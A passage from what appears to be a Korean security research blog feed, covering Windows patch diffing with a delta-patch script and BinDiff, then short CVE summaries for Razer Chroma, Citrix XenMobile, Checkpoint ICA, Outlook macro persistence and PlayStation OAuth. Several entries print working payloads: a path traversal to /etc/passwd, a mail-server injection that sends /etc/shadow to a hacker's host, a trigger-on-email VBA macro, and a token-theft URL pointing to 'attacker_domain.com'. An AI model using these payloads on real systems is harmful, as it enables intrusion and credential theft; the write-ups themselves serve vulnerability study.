class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastError<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">apply_patches</span>(<span class="hljs-params">buf, buf_len, patch_path</span>):</span><span class="hljs-keyword">with</span> open(patch_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> p:patch = p.read()<span class="hljs-keyword">if</span> patch[:<span class="hljs-number">2</span>] != <span class="hljs-string">b&quot;PA&quot;</span>:patch_offset = patch.find(<span class="hljs-string">b&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(patch[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = patch[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = cast(patch_contents, wintypes.LPVOID)d_dest.uSize = len(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span>status = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+str(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:ap = argparse.ArgumentParser()mode = ap.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, help=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, default=<span class="hljs-literal">False</span>, help=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, required=<span class="hljs-literal">True</span> , help=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, required=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, help=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> open(args.input, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = len(inbuf)buf = cast(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span class="hljs-keyword">for</span> patch <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, patch)alloc_list.append(buf)output_buf = bytes((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> open(args.output, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)hash = hashlib.sha256(output_buf)print(str(len(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p>옵션 별 기능은 다음과 같습니다.</p><p>-i :  reverse 또는 forward differential 패치 할 바이너리 지정</p><p>-n : null differential</p><p>-o : 패치 된 결과 파일 생성</p><p>-p : 패치 diff파일 지정</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\ntoskrnl.exe ^<span class="hljs-literal">-o</span> result_ntoskrnl.exe <span class="hljs-literal">-p</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\r\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/3.png"></p><p>1082 버전의 <code>ntoskrnl.exe</code>를 같은 버전의 reverse diff 파일로 패치해 기본 버전으로 롤백한 결과입니다.</p><p>사진과 같이 successfully applied 메시지와 hash 값이 뜨면 패치가 정상적으로 이루어진 것을 확인할 있어요.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/4.png"></p><p>속성에서 확인해 보면 10.0.18362.1 기본 버전으로 롤백이 잘 됐네요!</p><p>이제 우리가 업데이트 패키지에서 추출한 <code>ntoskrnl</code>의 1016버전 forward diff로 패치를 해보겠습니다</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> result_ntoskrnl.exe <span class="hljs-literal">-o</span> ntoskrnl_1016.exe ^<span class="hljs-literal">-p</span> [<span class="hljs-type">EXTRACTED</span> <span class="hljs-type">PATH</span>]\\amd64_microsoft...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1016</span>...\\f\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/5.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/6.png"></p><p>버전은 1016으로 잘 올라간 것 같군요. hash도 비교해보죠.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/7.png"></p><p>JUNK의 ntoskrnl manifest에서 참고한 hash도 일치하네요! 이로써 패치 스크립트로 정상적으로 패치 된 것을 확인할 수 있습니다.</p><h1 id="Binary-Diffing"><a href="#Binary-Diffing" class="headerlink" title="Binary Diffing"></a>Binary Diffing</h1><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/8.png"></p><p>(글을 쓰고 있는 지금 내 상태)</p><p>바이너리 패치가 이렇게 힘들 일인가..? 격하게 아무것도 안하고 싶어졌지만 기왕 쓰기 시작한 거 끝은 봐야 하지 않겠습니까 으아악 빨리 끝내고 술 먹으러 가야지</p><p>마지막! diffing tool과 분석 방법입니다.</p><p>Diffing은 IDA에서 진행하며 BinDiff라는 플러그인을 사용합니다.  BinDiff는 무료로 배포되는 코드 분석 IDA 플러그인입니다. 유명한 만큼 성능 하나는 확실한 친구죠?</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/9.png"></p><p>BinDiff는 아래 링크에서 설치할 수 있습니다.</p><p><a href="https://www.zynamics.com/software.html">zynamics.com - Software</a></p><blockquote><p>IDA 7.2, BinDiff 5(BinExport 10)에서 진행했습니다.</p></blockquote><p>IDA가 설치된 경로를 입력하고 설치하면 되며 정상적으로 설치가 되었다면 IDA의 Edit → Plugins에서 BinDiff를 보실 수 있습니다.</p><p>우선 1016, 1082를 각각 을 열고 Edit→Plugins→BinExport10을 실행합니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/10.png"></p><p>그리고 BinExport v2 Binary Export로 각각 Export 해주면 준비는 끝!</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/11.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/12.png"></p><p>이제 BinDiff를 실행해서 Workspace를 만들고 Diff→New Diff에서 Export 한 두 바이너리를 선택합니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/13.png"></p><p>Export한 파일을 선택하고 Diff하면..!</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/14.png"></p><p>이렇게 Overview를 볼 수 있습니다. Similarity는 유사도를 나타내는데, 1에 가까울수록 차이가 없다는 뜻입니다.</p></br><p>아래로 내려보면 Similarity가 낮은 항목을 볼 수 있는데, 이 중 한 항목을 우클릭→Open Flow Graph를 실행하면</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/15.png"></p><p>이렇게 그래프로 보여줍니다.  각 노드 색별 의미는 다음과 같습니다.</p><p>초록색 - 변경점 없음</p><p>노란색 - 변경점 있음</p><p>빨간색  - 패치에 의해 제거됨</p><p>회색 - 패치에 의해 추가됨</p><p>좀 더 자세히 볼까요? 보려는 노드를 선택해보겠습니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/16.png"></p><p>이렇게 어셈블리 코드까지 볼 수 있습니다. 이런 방식으로 변경점을 트레이싱하면 어떤 부분이 패치되었는지 자세히 볼 수 있겠죠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며.."></a>마치며..</h1><p>패치 스크립트를 만들어 뒀으니 원데이 분석할 때 유용하게 쓸 수 있을 것 같네요 ㅎㅎ 이제 취약점.. 취약점만 찾으면 되는데….</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/17.png"></p><blockquote><p>아마 안될거야..</p></blockquote><p>다음엔 다른 주제로 찾아오겠습니다. 조금만 놀구요 ㅎ (<em>망할 코로나 얼른 꺼져줬으면 ^^!)</em></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
    <link href="/2020/11/28/fabu1ous/2020-11-28/"/>
    <url>/2020/11/28/fabu1ous/2020-11-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer Chroma는 Razer사의 게이밍용 컴퓨터 주변기기들의 RGB 효과를 제어하는 플러그인으로 Razer synapse 설치 시 자동으로 설치됩니다. SDK가 존재해서 third party가 Razer Chroma와 연동되는 기능을 만들 수 있습니다. </p><p>예 ) Razer 제품과 RGB효과를 동기화하는 케이스, 음악에 맞춰 Razer 제품의 RGB를 변화시키는 음악 스트리밍 서비스 </p><p>Razer Chroma SDK Rest server는 Razer Chroma를 사용하는 컴퓨터에서 동작하고 있으며 모든 네트워크 인터페이스와 bind 해 54236번 포트로 listen 합니다. <code>http://localhost:54235/razer/chromasdk</code> 혹은<code> https://chromasdk.io:54236/razer/chromasdk</code> URI로 App info를 담은 POST request를 받으면 그 App info에 따라 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 실행파일을 생성하고 실행합니다.</p><p>몇 가지 이슈로 인해 race-condition을 이용한 arbitrary code execution이 가능합니다.</p><ol><li><p>해커는 Razer Chroma SDK Rest server가 동작하는 컴퓨터(이하 victim)의 IP주소만 알면 원격으로 POST request를 보내 임의의 파일명을 갖는 실행파일을 victim에 생성할 수 있습니다.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST request를 받아 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 생성한 실행파일은 Admin권한이 있는 유저만 수정할 수 있습니다. 하지만 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더는 Admin 권한이 없어도 수정이 가능합니다.</li></ol><ol start="3"><li>POST request로 생성할 실행파일(test.exe)과 동일한 이름의 파일이 이미 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더 안에 존재하면 Razer Chroma SDK Rest server는 기존 파일의 내용을 덮어씁니다. 하지만 그 실행파일의 권한은 그 파일이 실행되기 전까진 수정하지 않으므로, 해커는 race-condition으로 test.exe의 내용을 수정해  arbitrary code execution을 할 수 있습니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>razer</tag>
      
      <tag>chroma</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
    <link href="/2020/11/27/l0ch/2020-11-27/"/>
    <url>/2020/11/27/l0ch/2020-11-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>조직 구성원들의 모바일 디바이스 및 애플리케이션을 관리하는 Endpoint Management 솔루션인 XenMobile에서 path traversal로 권한이 없는 사용자가 패스워드를 포함한 임의 파일을 읽을 수 있고, 암호화된 패스워드를 복호화 할 수 있는 취약점이 발견되었습니다.</p><p><code>help-sb-download.jsp</code> 에 존재하는 취약한 코드는 아래와 같습니다.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>매개변수로 받는 <code>sbFileName</code>은 <code>sbFilePath</code>의 <code>/op/sas/support/</code> 뒤에 연결되고 File 클래스 생성자의 인수가 됩니다. <code>sbFileName</code>에 <code>../../../etc/passwd</code>를 전달하면 <code>/etc/passwd</code>의 내용을 출력할 수 있습니다.</p><p>이를 이용해 암호화된 패스워드의 복호화도 가능합니다. 패스워드 암호화는 <code>/opt/sas/sw/lib/libsecure.so</code> 와 <code>DataSecurity.jar</code> 라이브러리에서 이루어지며  <code>/opt/sas/rt/keys/security.properties</code>에는 암호화 키가 존재합니다. 해커가 path traversal 취약점을 악용해 라이브러리와 key를 다운로드하고 로컬 환경에서 암호화 라이브러리를 import 해 패스워드를 복호화할 수 있습니다.</p><p>이 취약점은 <code>help-sb-download.jsp</code> 파일을 제거하는 것으로 패치가 이루어졌습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary file download</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6020: Checkpoint ICA Management Tool에서 발견된 취약점 2가지</title>
    <link href="/2020/11/26/idioth/2020-11-26/"/>
    <url>/2020/11/26/idioth/2020-11-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management의 ICA(Internal Certificate Authority) Management Tool에서 Argument Injection과 Denial of Service 취약점이 발견되었습니다. ICA Management Tool은 기본적으로 비활성화되어있으며 <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>로 활성화할 수 있으며 설정이 활성화되면 http://<smartcenter_ip>:18265/를 통해 접근할 수 있습니다. <code>cpca_client set_mgmt_tool on -no_ssl</code>을 통해 활성화할 시 인증 없이 해당 서비스에 접근이 가능하며 Manage Certificates에 접속했을 때 관리자인지 별도의 확인을 진행하지 않습니다.</p><p>ICA Management Tool에서 메일을 보내는 프로세스인 cpca는 sendmail 바이너리를 통하여 메일을 전송합니다. sendmail은 파일 전송 기능을 지원하지만 메일을 보낼 때 누가 보내는지 확인을 하지 않으며 최고 권한으로 실행되므로 모든 파일에 접근이 가능합니다. 따라서 인자로 파일 이름을 넘겨주면 해커의 메일 서버로 파일을 전송할 수 있습니다. </p><p>해커가 netcat 등을 통해 서버를 연 후 Configure the CA의 “Management Tool mail server”에 <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>를 입력하면 해커의 메일 서버에 <code>/etc/shadow</code> 파일 내용이 메일 형식으로 날아오게 됩니다.</p><p>Denial of Service의 경우 입력 값에 대한 유효성 검사 실패로 인해 발생합니다. 원격 클라이언트가 다음과 같은 형식으로 POST request를 보낼 경우 프로그램이 종료됩니다.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>dos</tag>
      
      <tag>argument injection</tag>
      
      <tag>checkpoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Outlook Mail based Persistence access</title>
    <link href="/2020/11/25/fabu1ous/2020-11-25/"/>
    <url>/2020/11/25/fabu1ous/2020-11-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook은 Microsoft Office의 이메일 클라이언트로 일정 관리, 연락처 관리, 일지 등의 다양한 기능을 제공합니다. 그중 다른 Office 제품들과 마찬가지로 Outlook은 VBA(Visaul Basic for Application) 기반 매크로를 만들어 사용하는 기능이 있고, 해커는 이를 악용해 persistence access를 얻을 수 있습니다.</p><p>Persistence access란 해커가 victim에 initial access를 획득한 이후에도 지속적으로 access 할 수 있는 상태입니다. 특정 제목의 이메일이 도착하면 트리거 되는 악성 매크로를 victim에 심어놓으면 해커는 단순히 이메일을 보내는 것만으로 원격 제어할 수 있습니다.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>위 POC 코드는 calc.exe를 실행하는 VBA 매크로입니다. 우선 Outlook이 실행됐을 때의 수신 메일함 상태를 저장합니다. 이후에 새로운 이메일이 추가되면 그 이메일의 제목을 확인하고, 만약 그 제목이 “MDSec”이라면 calc.exe를 실행한 후 해당 이메일을 삭제합니다.</p><p>이메일의 제목뿐만 아니라 발신 주소 혹은 내용 등으로 매크로의 트리거 조건을 다양하게 설정할 수 있고, calc.exe 대신 리버스 쉘을 실행하면 해커가 원격 제어를 할 수 있게 됩니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>outlook</tag>
      
      <tag>email</tag>
      
      <tag>persistence access</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Access token stealing in playstation</title>
    <link href="/2020/11/24/l0ch/2020-11-24/"/>
    <url>/2020/11/24/l0ch/2020-11-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>콘솔 게임기기인 PlayStation의 커뮤니티 <a href="https://my.playstation.com/auth/response.html%EC%97%90%EC%84%9C">https://my.playstation.com/auth/response.html에서</a> 로그인된 사용자의 Access Token을 탈취할 수 있는 취약점이 발견되었습니다.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> 페이지는 발급 서버에서 클라이언트로 OAuth 액세스 토큰을 전송하는 자바스크립트를 호스팅 합니다.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) &#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>호스팅된 위 자바스크립트에서 아래 과정을 통해 access token을 해커의 서버로 전송할 수 있습니다.</p><ol><li>request query를 <code>parseResponse()</code> 함수에서 파싱 한 뒤  <code>sendResponseToApp()</code> 의 매개변수로 전달해 호출합니다.</li><li>query 중 <code>reqeustID</code> 필드 값이 “window” 면 <code>window.opener.postMessage()</code>를 호출합니다.</li><li><code>window.opener.postMessage()</code> 는 첫 번째 매개변수를 두 번째 매개변수인 특정 도메인으로 전달할 수 있습니다. 매개변수로 query와 <code>targetOrigin</code> 필드 값이 전달되면 <code>targetOrigin</code> 도메인으로 query에 포함되어 있는 Access Token을 전송할 수 있습니다.</li></ol><p>이를 이용한 최종 페이로드는 다음과 같습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>위 페이로드를 OAuth 발급 서버 request query의 <code>redirect_uri</code> 필드 값으로 보내면 Access Token을 탈취할 수 있습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>L0ch</tag>
      
      <tag>access token stealing</tag>
      
      <tag>playstation</tag>
      
      <tag>javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-5990: NVIDIA GeForce Experience Local Privilege Escalation</title>
    <link href="/2020/11/23/idioth/2020-11-23/"/>
    <url>/2020/11/23/idioth/2020-11-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA GeForce Experience 3.20.5.70 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVDIA GeForce Experience의 GeForce 그래픽카드가 설치된 장비로 원격 게임을 지원하는 GAMESTREAM 기능에서 Local Privilege Escalation 취약점이 발견되었습니다.</p><p>nvcontainer.exe 프로세스는 user impersonation 없이 <code>C:\\ProgramData\\NVIDIA Corporation\\ShadowPlay\\</code> 디렉터리에 <code>CaptureCore.log</code> 파일을 쓰거나 생성합니다. 이때 상위 폴더 상속으로 인해 모든 사용자는 해당 파일과 파일이 있는 폴더에 모든 권한을 갖습니다. 하지만 <code>CaptureCore.log</code> 파일을 삭제한 후 GAMESTREAM을 재시작하면 <code>nvspapi64.dll</code>에서 소프트 링크와 하드 링크에 대한 검사를 진행하여 심볼릭 링크 파일을 삭제합니다. 이 작업은 <code>nvspapi64.dll</code>에서 수행되는데 검사를 진행한 후 <code>CaptureCore.log</code>에 대한 핸들을 닫고 최종 경로를 가져와 작업을 수행하기 위해 다시 핸들을 엽니다.</p><p><img src="/2020/11/23/idioth/2020-11-23/image.png"></p><p>이를 활용하여 특정 파일에 대한 access event를 catch 하는 <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">OpLock</a>을 CaptureCore.log에 설정한 후 검사를 진행하면 OpLock이 트리거 되어 C:\Windows\System32 폴더에 arbitrary file creation이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>geforce experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.1</title>
    <link href="/2020/11/22/idioth/av_evasion_part1/"/>
    <url>/2020/11/22/idioth/av_evasion_part1/</url>
    
